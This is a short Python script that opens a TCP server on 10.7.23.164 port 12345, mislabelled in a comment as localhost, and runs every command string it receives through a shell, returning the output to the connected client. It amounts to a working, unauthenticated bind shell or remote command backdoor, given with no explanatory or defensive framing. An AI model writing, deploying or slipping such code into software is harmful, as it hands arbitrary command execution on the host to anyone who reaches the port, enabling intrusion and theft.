import socket
import subprocess

def main():
    host = '10.7.23.164'  # Localhost
    port = 12345        # Port to listen on

    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as server_socket:
        server_socket.bind((host, port))
        server_socket.listen()
        print(f"Server listening on {host}:{port}")

        conn, addr = server_socket.accept()
        with conn:
            print(f"Connected by {addr}")
            while True:
                command = conn.recv(1024).decode()
                if not command:
                    break
                
                print(f"Received command: {command}")
                try:
                    # Execute the command and capture the output
                    output = subprocess.check_output(command, shell=True, stderr=subprocess.STDOUT)
                    response = output.decode()
                except subprocess.CalledProcessError as e:
                    response = e.output.decode()
                
                conn.sendall(response.encode())

if __name__ == "__main__":
    main()
